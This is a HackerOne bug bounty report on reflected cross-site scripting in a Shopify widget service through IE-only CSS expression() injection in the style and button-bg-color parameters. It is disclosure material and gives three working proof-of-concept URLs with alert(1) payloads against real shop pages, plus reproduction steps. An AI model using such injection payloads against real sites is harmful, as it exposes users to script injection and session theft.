# many xss in widgets.shopifyapps.com

## Metadata
- **Source:** HackerOne
- **Report:** 105659 | https://hackerone.com/reports/105659
- **Submitted:** 2015-12-16
- **Reporter:** sergeym
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
xss does work only for internet explorer browser version <=10 (or in compatible mode)

xss in https://widgets.shopifyapps.com/products/...?style=[xss]&button-bg-color=[xss]
is affected parameters style and button-bg-color (maybe to include expression in style of page)

example of xss for ie(i have test ie8 , windows os) : 

https://widgets.shopifyapps.com/products/the-inbreds-winning-hearts?shop=z

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

xss does work only for internet explorer browser version <=10 (or in compatible mode)

xss in https://widgets.shopifyapps.com/products/...?style=[xss]&button-bg-color=[xss]
is affected parameters style and button-bg-color (maybe to include expression in style of page)

example of xss for ie(i have test ie8 , windows os) : 

https://widgets.shopifyapps.com/products/the-inbreds-winning-hearts?shop=zunior.myshopify.com&style=artgallery&image-size=compact&button-bg-color=expression(alert(1))

https://widgets.shopifyapps.com/products/buldre-bursdag-ekstra-personer?shop=klatrefabrikken.myshopify.com&style=artgallery&button-bg-color=expression(alert(1))

https://widgets.shopifyapps.com/products/c-of-change?shop=rox-spa-md.myshopify.com&style=h%20.product-buy-button{x:expression(alert(1))}

how to reproduce:
1. to use ie with version <=10
2. go to the page (look at up)
3. will be alert box with 1


</details>

---
*Analysed by Claude on 2026-05-24*
